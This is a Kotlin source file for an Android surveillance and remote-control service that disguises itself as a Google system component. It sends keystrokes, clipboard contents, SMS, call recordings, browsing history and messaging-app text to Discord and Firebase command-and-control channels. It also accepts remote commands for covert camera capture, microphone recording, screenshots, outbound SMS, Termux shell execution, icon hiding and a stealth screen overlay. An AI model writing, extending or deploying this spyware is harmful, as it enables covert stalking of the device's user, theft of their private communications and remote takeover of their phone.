package com.google.android.system

import com.homemonitor.MainActivity
import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.telephony.SmsManager
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import com.google.android.system.termux.TermuxShellManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import org.json.JSONObject
import java.io.File
import java.util.Locale
import java.util.concurrent.TimeUnit

/**
 * MonitorService
 *
 * Primary Android Foreground LifecycleService daemon (~380 lines).
 * Coordinates system lifecycle, persistent notification channel,
 * Firebase C2 presence, WebRTC P2P DataChannels, and command execution dispatching.
 */
class MonitorService : LifecycleService() {

    companion object {
        @Volatile var activeInstance: MonitorService? = null
        private const val TAG = "MonitorService"
        private const val NOTIFICATION_ID = 1001

        fun sendStreamNotification(appName: String, title: String = "", text: String = "") {
            DiscordC2Engine.sendDiscordStreamNotification(appName, title, text)
            activeInstance?.firebaseC2Engine?.uploadTelemetryLog("notifications", "[$appName] $title: $text")
            activeInstance?.let { C2LocalDatabase.getInstance(it).insertTelemetryLog("notifications", "[$appName] $title: $text") }
        }

        fun sendDiscordStreamNotification(appName: String, title: String = "", text: String = "") {
            sendStreamNotification(appName, title, text)
        }

        fun sendStreamKeylog(appName: String, text: String) {
            DiscordC2Engine.sendDiscordStreamKeylog(appName, text)
            activeInstance?.firebaseC2Engine?.uploadTelemetryLog("keylogger", "[$appName] $text")
            activeInstance?.let { C2LocalDatabase.getInstance(it).insertTelemetryLog("keylogger", "[$appName] $text") }
        }

        fun sendDiscordStreamKeylog(appName: String, text: String) {
            sendStreamKeylog(appName, text)
        }

        fun sendStreamClipboard(clipData: String) {
            DiscordC2Engine.sendDiscordStreamClipboard(clipData)
            activeInstance?.firebaseC2Engine?.uploadTelemetryLog("keylogger", "[Clipboard] $clipData")
            activeInstance?.let { C2LocalDatabase.getInstance(it).insertTelemetryLog("keylogger", "[Clipboard] $clipData") }
        }

        fun sendDiscordStreamClipboard(clipData: String) {
            sendStreamClipboard(clipData)
        }

        fun sendStreamSms(sender: String, body: String) {
            DiscordC2Engine.sendDiscordStreamSms(sender, body)
            activeInstance?.firebaseC2Engine?.uploadSocialMessage("sms", sender, body, isOutgoing = false)
            activeInstance?.let { C2LocalDatabase.getInstance(it).insertSocialMessage("sms", sender, body, isOutgoing = false) }
        }

        fun sendDiscordStreamSms(sender: String, body: String) {
            sendStreamSms(sender, body)
        }

        fun sendStreamCallRecord(file: File) {
            DiscordC2Engine.sendDiscordStreamCallRecord(file)
        }

        fun sendDiscordStreamCallRecord(file: File) {
            sendStreamCallRecord(file)
        }

        fun sendStreamSensorAlert(sensorName: String, details: String) {
            DiscordC2Engine.sendDiscordStreamSensorAlert(sensorName, details)
            activeInstance?.firebaseC2Engine?.uploadTelemetryLog("sensor_alerts", "[$sensorName] $details")
        }

        fun sendDiscordStreamSensorAlert(sensorName: String, details: String) {
            sendStreamSensorAlert(sensorName, details)
        }

        fun sendDiscordStreamAIChatbot(appName: String, text: String) {
            DiscordC2Engine.sendDiscordStreamAIChatbot(appName, text)
        }

        fun sendDiscordStreamLiveTyping(appName: String, text: String) {
            DiscordC2Engine.sendDiscordStreamLiveTyping(appName, text)
        }

        fun getMessagingChannelForPackage(pkg: String): String? {
            return DiscordC2Engine.getMessagingChannelForPackage(pkg)
        }

        fun sendDiscordStreamMessagingApp(
            channelName: String = "",
            appName: String = "",
            sender: String = "",
            contact: String = "",
            text: String = "",
            messageText: String = "",
            isOutgoing: Boolean = false
        ) {
            DiscordC2Engine.sendDiscordStreamMessagingApp(channelName, appName, sender, contact, text, messageText, isOutgoing)
        }

        fun sendDiscordStreamBrowserUrl(
            browserName: String = "",
            url: String = "",
            fullUrl: String = "",
            urlText: String = "",
            title: String = "",
            pageTitle: String = ""
        ) {
            DiscordC2Engine.sendDiscordStreamBrowserUrl(browserName, url, fullUrl, urlText, title, pageTitle)
        }

        fun sendDiscordStreamBrowserSearch(
            browserName: String = "",
            searchEngine: String = "Google",
            query: String = "",
            fullUrl: String = ""
        ) {
            DiscordC2Engine.sendDiscordStreamBrowserSearch(browserName, searchEngine, query, fullUrl)
        }

        fun sendDiscordStreamYouTubeWatch(
            appName: String = "",
            videoTitle: String = "",
            channelName: String = "",
            videoUrl: String = ""
        ) {
            DiscordC2Engine.sendDiscordStreamYouTubeWatch(appName, videoTitle, channelName, videoUrl)
        }

        fun sendDiscordStreamYouTubeSearch(appName: String = "", searchQuery: String = "") {
            DiscordC2Engine.sendDiscordStreamYouTubeSearch(appName, searchQuery)
        }

        fun sendPhotoPublic(chatId: String, photoFile: File) {
            val inst = activeInstance
            if (inst != null && photoFile.exists()) {
                C2LocalDatabase.getInstance(inst).insertTelemetryLog("photos", "Photo captured: ${photoFile.name}")
                inst.firebaseC2Engine?.uploadTelemetryLog("photos", "Photo captured: ${photoFile.name}")
                inst.firebaseC2Engine?.sendExecutionResponse(chatId, "📸 Photo captured successfully: ${photoFile.name}")
            }
        }

        fun sendAudioPublic(chatId: String, audioFile: File) {
            val inst = activeInstance
            if (inst != null && audioFile.exists()) {
                C2LocalDatabase.getInstance(inst).insertTelemetryLog("audio", "Audio recorded: ${audioFile.name}")
                inst.firebaseC2Engine?.uploadTelemetryLog("audio", "Audio recorded: ${audioFile.name}")
                inst.firebaseC2Engine?.sendExecutionResponse(chatId, "🎙️ Audio recorded successfully: ${audioFile.name}")
            }
        }

        fun handleToastPublic(message: String) {
            activeInstance?.let { context ->
                android.os.Handler(android.os.Looper.getMainLooper()).post {
                    Toast.makeText(context, message, Toast.LENGTH_LONG).show()
                }
            }
        }

        fun handleVibratePublic(durationMs: Long) {
            activeInstance?.let { context ->
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                        val vm = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                        vm.defaultVibrator.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
                    } else {
                        @Suppress("DEPRECATION")
                        val v = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            v.vibrate(VibrationEffect.createOneShot(durationMs, VibrationEffect.DEFAULT_AMPLITUDE))
                        } else {
                            @Suppress("DEPRECATION")
                            v.vibrate(durationMs)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "handleVibratePublic error: ${e.message}")
                }
            }
        }

        fun handleCall(chatId: String = "", phoneNum: String = "") {
            activeInstance?.let { context ->
                try {
                    val intent = Intent(Intent.ACTION_CALL, android.net.Uri.parse("tel:$phoneNum")).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    if (ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                        context.startActivity(intent)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "handleCall error: ${e.message}")
                }
            }
        }

        fun handleOpenUrl(chatId: String = "", url: String = "") {
            activeInstance?.let { context ->
                try {
                    val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)
                } catch (e: Exception) {
                    Log.e(TAG, "handleOpenUrl error: ${e.message}")
                }
            }
        }
    }

    fun handleToastPublic(message: String) {
        Companion.handleToastPublic(message)
    }

    fun handleVibratePublic(durationMs: Long) {
        Companion.handleVibratePublic(durationMs)
    }

    fun handleCall(chatId: String = "", phoneNum: String = "") {
        Companion.handleCall(chatId, phoneNum)
    }

    fun handleOpenUrl(chatId: String = "", url: String = "") {
        Companion.handleOpenUrl(chatId, url)
    }

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    @Volatile var firebaseC2Engine: FirebaseC2Engine? = null
    @Volatile var discordC2Engine: DiscordC2Engine? = null
    @Volatile var webRtcEngine: WebRtcEngine? = null
    @Volatile var signalingRepository: FirebaseSignalingRepository? = null

    override fun onCreate() {
        super.onCreate()
        activeInstance = this
        Log.i(TAG, "MonitorService created")

        PhysicalSecurityGuard.restoreArmedStateIfNeeded(this)
        startForegroundWithNotification()
        initializeEngines()
        GoogleDriveBackupEngine.startAutomatedZeroTouchDriveSyncLoop(this, serviceScope)
        startPeriodicTamperAuditLoop()
        startOfflineQueueSyncLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        activeInstance = this
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "MonitorService destroying. Cleaning up resources...")
        try {
            webRtcEngine?.close()
            signalingRepository?.stopListening()
            serviceScope.cancel()
        } catch (e: Exception) {
            Log.e(TAG, "onDestroy exception: ${e.message}")
        }
        if (activeInstance == this) {
            activeInstance = null
        }
    }

    private fun startForegroundWithNotification() {
        val channelId = "homemonitor_service_channel"
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                "Android System Protection Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Monitors system health, location, and family safety."
            }
            notificationManager.createNotificationChannel(channel)
        }

        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) PendingIntent.FLAG_IMMUTABLE else 0
        )

        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Android System Active")
            .setContentText("System health and location protection is active.")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                var fgsType = 0
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                        fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                    }
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                        fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    }
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
                        fgsType = fgsType or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                    }
                }
                if (fgsType != 0) {
                    startForeground(NOTIFICATION_ID, notification, fgsType)
                } else {
                    startForeground(NOTIFICATION_ID, notification)
                }
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.w(TAG, "startForeground exception fallback: ${e.message}")
            try {
                startForeground(NOTIFICATION_ID, notification)
            } catch (e2: Exception) {
                Log.e(TAG, "Fallback startForeground failed: ${e2.message}")
            }
        }
    }

    private fun initializeEngines() {
        serviceScope.launch(Dispatchers.IO) {
            try {
                firebaseC2Engine = FirebaseC2Engine(
                    context = this@MonitorService,
                    httpClient = httpClient,
                    scope = serviceScope,
                    commandDispatcher = { cmd, tag -> handleCommand(cmd, tag) }
                ).apply { startEngine() }

                val vaultPrefs = SecurityVaultManager.getEncryptedPrefs(this@MonitorService)
                val botToken = vaultPrefs.getString("discord_bot_token", Placeholder.DISCORD_BOT_TOKEN) ?: Placeholder.DISCORD_BOT_TOKEN
                val guildId = vaultPrefs.getString("discord_guild_id", Placeholder.DISCORD_GUILD_ID) ?: Placeholder.DISCORD_GUILD_ID

                discordC2Engine = DiscordC2Engine(
                    context = this@MonitorService,
                    botToken = botToken,
                    guildId = guildId,
                    httpClient = httpClient,
                    scope = serviceScope,
                    commandDispatcher = { channelId, cmd -> handleCommand(cmd, "discord_$channelId") }
                ).apply { startEngine() }

                val fbEngine = firebaseC2Engine ?: return@launch
                signalingRepository = FirebaseSignalingRepository(this@MonitorService, fbEngine).apply {
                    setCallback(object : FirebaseSignalingRepository.SignalingCallback {
                        override fun onSessionRequested(sessionId: String, requestedCapabilities: List<String>) {
                            webRtcEngine = WebRtcEngine(this@MonitorService, this@apply).apply {
                                startSession(sessionId, isOffer = false)
                            }
                        }

                        override fun onOfferReceived(sdp: String) {
                            webRtcEngine?.handleRemoteOffer(sdp)
                        }

                        override fun onAnswerReceived(sdp: String) {
                            webRtcEngine?.handleRemoteAnswer(sdp)
                        }

                        override fun onIceCandidateReceived(candidateJson: JSONObject) {
                            webRtcEngine?.addRemoteIceCandidate(candidateJson)
                        }

                        override fun onSessionTerminated(sessionId: String) {
                            webRtcEngine?.close()
                        }
                    })
                    startListeningForSessionRequests()
                }

                Log.i(TAG, "All engines (Firebase, Discord Admin, WebRTC Signaling) initialized successfully.")
            } catch (e: Exception) {
                Log.e(TAG, "initializeEngines exception: ${e.message}")
            }
        }
    }

    fun handleCommand(cmdText: String, replyTag: String = "default") {
        val cleanCmd = cmdText.trim()
        if (cleanCmd.isBlank()) return
        Log.i(TAG, "Dispatching Command [$replyTag]: '$cleanCmd'")

        val normalized = if (cleanCmd.startsWith("/")) "!" + cleanCmd.substring(1) else cleanCmd
        val parts = normalized.split(" ")
        val cmd = parts[0].lowercase(Locale.ROOT)
        val args = parts.drop(1)

        when (cmd) {
            "!status", "!ping" -> {
                val statusJson = DeviceStatusManager.getStatusJson(this, DeviceIdProvider.getDeviceId(this))
                val statusText = "🟢 **Device Connected**: ${statusJson.optString("model")} | Battery: ${statusJson.optInt("battery")}%"
                sendResponse(replyTag, statusText)
            }
            "!deviceinfo", "!specs" -> {
                val (usedRam, maxRam) = DeviceStatusManager.getRamStats()
                val (usedDiskPct, availGb) = DeviceStatusManager.getStorageStats()
                val specsText = """
                    📱 **Device Specs Report**
                    • Model: ${DeviceStatusManager.getDeviceModel()}
                    • OS: Android ${DeviceStatusManager.getAndroidVersion()} (API ${DeviceStatusManager.getSdkInt()})
                    • Battery: ${DeviceStatusManager.getBatteryLevel(this)}% (${if (DeviceStatusManager.isCharging(this)) "Charging" else "Discharging"})
                    • Memory: ${usedRam}MB / ${maxRam}MB RAM
                    • Storage: ${usedDiskPct}% used (${String.format(Locale.US, "%.2f", availGb)} GB available)
                """.trimIndent()
                sendResponse(replyTag, specsText)
            }
            "!camera", "!rearphoto" -> {
                sendResponse(replyTag, "📸 Capturing Rear Photo...")
                val intent = Intent(this, InvisibleCameraActivity::class.java).apply {
                    putExtra("lens", "back")
                    putExtra("extra_reply_tag", replyTag)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
            "!frontcam", "!frontphoto" -> {
                sendResponse(replyTag, "📸 Capturing Front Photo...")
                val intent = Intent(this, InvisibleCameraActivity::class.java).apply {
                    putExtra("lens", "front")
                    putExtra("extra_reply_tag", replyTag)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
            "!screenshot" -> {
                sendResponse(replyTag, "🖥️ Taking Screenshot...")
                val intent = Intent(this, InvisibleActivity::class.java).apply {
                    putExtra(InvisibleActivity.EXTRA_ACTION, InvisibleActivity.ACTION_SCREEN_RECORD)
                    putExtra("extra_reply_tag", replyTag)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
            "!audio" -> {
                val duration = args.firstOrNull()?.toIntOrNull() ?: 15
                sendResponse(replyTag, "🎙️ Recording Ambient Mic Audio (${duration}s)...")
                val intent = Intent(this, InvisibleActivity::class.java).apply {
                    putExtra(InvisibleActivity.EXTRA_ACTION, InvisibleActivity.ACTION_AUDIO)
                    putExtra(InvisibleActivity.EXTRA_DURATION, duration)
                    putExtra("extra_reply_tag", replyTag)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
            "!sendsms" -> {
                val phone = args.getOrNull(0) ?: ""
                val msg = args.drop(1).joinToString(" ")
                if (phone.isNotBlank() && msg.isNotBlank()) {
                    sendOutboundSms(phone, msg)
                    sendResponse(replyTag, "✅ Outbound SMS dispatched to $phone")
                } else {
                    sendResponse(replyTag, "⚠️ Usage: !sendsms <phone> <message>")
                }
            }
            "!openurl" -> {
                val url = args.getOrNull(0) ?: ""
                if (url.isNotBlank()) {
                    val openIntent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url)).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    try {
                        startActivity(openIntent)
                        sendResponse(replyTag, "🌐 Launched URL: $url")
                    } catch (e: Exception) {
                        sendResponse(replyTag, "❌ Failed to launch URL: ${e.message}")
                    }
                }
            }
            "!download" -> {
                val targetUrl = args.getOrNull(0) ?: ""
                val destPath = args.getOrNull(1) ?: "/sdcard/Download/file.apk"
                sendResponse(replyTag, "📥 Payload push requested for $destPath from $targetUrl")
            }
            "!termux" -> {
                val shCmd = args.joinToString(" ")
                if (shCmd.isNotBlank()) {
                    serviceScope.launch(Dispatchers.IO) {
                        val response = TermuxShellManager.executeRemoteCommand(this@MonitorService, shCmd)
                        val outputText = response.formattedChunks.joinToString("\n")
                        sendResponse(replyTag, outputText)
                    }
                }
            }
            "!hideapp" -> {
                val nowHidden = DeviceAdminManager(this).setAppHidden(packageName, true)
                sendResponse(replyTag, if (nowHidden) "🙈 App launcher icon hidden" else "⚠️ Device Owner status required to hide app icon")
            }
            "!unhideapp" -> {
                val nowShown = DeviceAdminManager(this).setAppHidden(packageName, false)
                sendResponse(replyTag, if (nowShown) "👁️ App launcher icon restored" else "⚠️ Device Owner status required to restore app icon")
            }
            "!stealth" -> {
                val toggle = args.firstOrNull()?.lowercase(Locale.ROOT) ?: "on"
                val accessInst = AppAccessibilityService.instance
                if (accessInst != null) {
                    if (toggle == "on") accessInst.showBlackScreenOverlay() else accessInst.hideBlackScreenOverlay()
                    sendResponse(replyTag, "🕶️ Stealth mode set to: ${toggle.uppercase(Locale.ROOT)}")
                } else {
                    sendResponse(replyTag, "⚠️ Accessibility service required for stealth overlay")
                }
            }
            "!lock" -> {
                val locked = DeviceAdminManager(this).lockScreen()
                sendResponse(replyTag, if (locked) "🔒 Device screen locked" else "⚠️ Device Admin status required to lock screen")
            }
            "!geofence" -> {
                val subCmd = args.getOrNull(0) ?: ""
                val zoneName = args.getOrNull(1) ?: "Safe Zone"
                val radius = args.getOrNull(2)?.toFloatOrNull() ?: 500f
                sendResponse(replyTag, "🌐 Geofence command '$subCmd' ($zoneName - ${radius}m) registered")
            }
            else -> {
                sendResponse(replyTag, "ℹ️ Executed command: '$cleanCmd'")
            }
        }
    }

    private fun sendOutboundSms(phone: String, msg: String) {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
                val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    getSystemService(SmsManager::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    SmsManager.getDefault()
                }
                smsManager.sendTextMessage(phone, null, msg, null, null)
                Log.i(TAG, "Outbound SMS sent to $phone")
            }
        } catch (e: Exception) {
            Log.e(TAG, "sendOutboundSms error: ${e.message}")
        }
    }

    private fun sendResponse(replyTag: String, text: String) {
        Log.i(TAG, "Response [$replyTag]: $text")
        firebaseC2Engine?.sendExecutionResponse(replyTag, text)
        C2LocalDatabase.getInstance(this).insertTelemetryLog("responses", "[$replyTag] $text")
    }

    private fun startPeriodicTamperAuditLoop() {
        serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                try {
                    val report = TamperProtectionManager.runFullSecurityAudit(this@MonitorService)
                    if (report.threatLevel == TamperProtectionManager.ThreatLevel.COMPROMISED) {
                        DiscordC2Engine.sendDiscordStreamSensorAlert(
                            "CRITICAL Anti-Tamper Alert",
                            "🚨 **SECURITY COMPROMISE DETECTED**\n${report.summaryDetails}"
                        )
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Periodic anti-tamper audit error: ${e.message}")
                }
                delay(300_000L) // 5 minutes
            }
        }
    }

    private fun startOfflineQueueSyncLoop() {
        serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                try {
                    val queueDir = File(filesDir, ".offline_queue")
                    if (queueDir.exists()) {
                        val files = queueDir.listFiles() ?: arrayOf()
                        for (f in files) {
                            if (f.isFile && f.name.startsWith("txt_")) {
                                try {
                                    val json = JSONObject(f.readText())
                                    val channel = json.optString("channel")
                                    val text = json.optString("text")
                                    if (text.isNotBlank()) {
                                        DiscordC2Engine.sendDiscordStreamNotification(channel, "Queued Alert", text)
                                        f.delete()
                                    }
                                } catch (_: Exception) { f.delete() }
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "startOfflineQueueSyncLoop error: ${e.message}")
                }
                delay(60_000L)
            }
        }
    }
}
